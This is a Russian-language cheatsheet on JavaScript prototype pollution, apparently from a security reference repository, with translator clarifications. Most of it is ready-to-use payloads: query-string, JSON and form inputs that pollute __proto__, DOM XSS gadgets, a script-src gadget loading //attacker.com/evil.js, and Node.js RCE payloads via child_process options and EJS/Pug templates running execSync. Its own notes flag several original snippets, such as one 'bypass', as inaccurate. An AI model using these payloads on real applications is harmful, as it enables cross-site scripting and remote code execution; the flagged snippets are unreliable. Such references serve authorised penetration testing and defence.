<a id="-prototype-pollution-cheatsheet"></a>
# 🧬 Справочник по загрязнению прототипов

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-what-is-prototype-pollution"></a>
## 🎯 Что такое загрязнение прототипов

> **Уточнение к оригиналу.** Как объясняет [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution), влияние зависит от цепочки наследования; объекты с нулевым прототипом не наследуют Object.prototype. Ручное присваивание Object.prototype в примере показывает механизм наследования, но само по себе не доказывает уязвимость входных данных приложения. Для последующей эксплуатации нужны доступный источник изменения прототипа и небезопасное использование свойства (gadget/sink).

**Загрязнение прототипов (Prototype Pollution)** — уязвимость JavaScript, при которой злоумышленник может изменять `Object.prototype`, затрагивая все объекты приложения.

<a id="impact"></a>
### Последствия
- 🔴 **XSS** — изменение DOM
- 🔴 **RCE** — выполнение кода на сервере (Node.js)
- 🔴 **Обход** — обход механизмов защиты
- 🔴 **DoS** — аварийное завершение приложения

---

<a id="-javascript-prototypes"></a>
## 🔍 Прототипы JavaScript

<a id="how-it-works"></a>
### Как это работает
```javascript
// Каждый объект наследует Object.prototype (упрощение оригинала; см. уточнение)
let obj = {};
obj.__proto__ === Object.prototype  // true

// Если изменить прототип:
Object.prototype.polluted = "hacked";

// Изменение затрагивает наследующие объекты:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

<a id="dangerous-properties"></a>
### Опасные свойства
```javascript
__proto__
constructor
prototype
```

---

<a id="-client-side-payloads"></a>
## 💉 Полезные нагрузки для клиентской стороны

<a id="via-url-queryhash"></a>
### Через URL (строку запроса или фрагмент)
```
# Базовый вариант
?__proto__[polluted]=value
?__proto__.polluted=value

# Через constructor
?constructor[prototype][polluted]=value

# Вложенный вариант
?__proto__[__proto__][polluted]=value

# В кодировке URL
?__proto__%5Bpolluted%5D=value
```

<a id="via-json"></a>
### Через JSON

> **Уточнение.** В JSON имя __proto__ является обычным ключом: одного разбора JSON недостаточно для загрязнения. В литерале объекта JavaScript его семантика иная. По [MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution), Object.assign может изменить прототип целевого объекта, не изменяя глобальный Object.prototype. Исходные фрагменты сохранены.
```javascript
// Пользовательский ввод
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Вложенный вариант
{"a": {"__proto__": {"polluted": "value"}}}
```

<a id="via-form-data"></a>
### Через данные формы
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

<a id="-exploitation-examples"></a>
## 🔥 Примеры эксплуатации

<a id="dom-xss-via-innerhtml"></a>
### DOM XSS через innerHTML
```javascript
// Если код выполняет следующее:
element.innerHTML = obj.html || "";

// Изменить прототип:
?__proto__[html]=<img src=x onerror=alert(1)>

// Результат: XSS!
```

<a id="script-src-gadget"></a>
### Гаджет на основе src скрипта
```javascript
// Если код выполняет следующее:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Изменить прототип:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

<a id="dom-clobbering-combo"></a>
### Сочетание с DOM clobbering
```javascript
// Типичные шаблоны гаджетов
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

<a id="jquery-gadgets"></a>
### Гаджеты jQuery

> **О версиях.** В [jQuery 3.4.0](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/) исправлена связанная с __proto__ проблема глубокого $.extend. Показанная ниже строка URL требует отдельного уязвимого обработчика и гаджета; она не является универсальным следствием использования jQuery.
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Эксплуатация
?__proto__[url]=javascript:alert(1)
```

---

<a id="-server-side-nodejs"></a>
## 🖥️ Серверная сторона (Node.js)

> **Уточнение.** У [child_process](https://nodejs.org/api/child_process.html) результат зависит от метода и переданных options. Примеры require/EJS/Pug зависят от версии, доступного гаджета и настроек приложения; наличие свойства само по себе не гарантирует RCE. Исходные значения и старые примеры сохранены.

<a id="rce-via-child_process"></a>
### RCE через child_process
```javascript
// Если приложение вызывает spawn/exec с объектом options:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Изменить прототип:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Или:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

<a id="rce-via-require"></a>
### RCE через require()
```javascript
// Полезная нагрузка для загрязнения прототипа
{"__proto__": {"main": "./pwned.js"}}
```

<a id="ejs-template-rce"></a>
### RCE в шаблонах EJS
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

<a id="pug-template-rce"></a>
### RCE в шаблонах Pug
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

<a id="-detection"></a>
## 🔍 Обнаружение

<a id="manual-testing"></a>
### Ручная проверка
```javascript
// В консоли браузера:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Если получено "polluted" — уязвимо (вывод оригинала; см. уточнение)

// Удалить внесённое свойство
delete Object.prototype.testPollution;
```

<a id="url-testing"></a>
### Проверка через URL
```
# Добавить в URL и проверить консоль
?__proto__[test]=polluted

// В консоли:
({}).test  // Ожидается undefined; если получено "polluted" — уязвимо (вывод оригинала; см. уточнение)
```

<a id="find-gadgets-dom-invader"></a>
### Поиск гаджетов с DOM Invader

> **Уточнение к инструменту.** [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) встроен в браузер Burp и включается в нём, а не устанавливается как обычное расширение Burp. Его [режим prototype pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution) отдельно ищет источники и гаджеты. Подпись об установке ниже передаёт замысел оригинала.
```
1. Подготовьте DOM Invader в браузере Burp Suite (см. уточнение)
2. Включите режим prototype pollution
3. Просмотрите приложение
4. Проверьте, есть ли пригодные для эксплуатации sinks (опасные точки обработки данных)
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

| Инструмент | Назначение |
|------|---------|
| **DOM Invader** | Средство Burp для обнаружения загрязнения прототипов (см. уточнение) |
| **ppfuzz** | Фаззер для поиска загрязнения прототипов |
| **ppmap** | Поиск гаджетов |
| **PPScan** | Сканер клиентской стороны |

<a id="ppmap-usage"></a>
### Использование ppmap
```bash
# Установка
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Сканирование
node ppmap.js https://target.com
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="payload-formats"></a>
### Форматы полезных нагрузок
| Формат | Полезная нагрузка |
|--------|---------|
| Строка запроса | `?__proto__[x]=y` |
| Фрагмент URL | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Слияние | `Object.assign({},input)` |

<a id="common-gadgets"></a>
### Распространённые гаджеты
| Свойство | Последствия |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Внедрение скрипта |
| `href` | Перенаправление |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

<a id="bypass-techniques"></a>
### Способы обхода ограничений

> **Уточнение к записи.** Возможность пройти через constructor.prototype зависит от доступного объекта и обработки ключей. Строка ["__proto__"]["polluted"] ниже сама по себе не обращается к прототипу обычного объекта: это выражение с массивом, а не универсальный обход. Декодирование Unicode также зависит от формата входа. Код оригинала сохранён.
```javascript
// Если __proto__ фильтруется:
constructor.prototype.polluted = "value"

// Другая форма записи
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Загрязнение прототипов: PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Загрязнение прототипов на сервере](https://portswigger.net/research/server-side-prototype-pollution)
- [Сканер загрязнения прототипов на клиентской стороне](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Исследуйте загрязнение прототипов!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
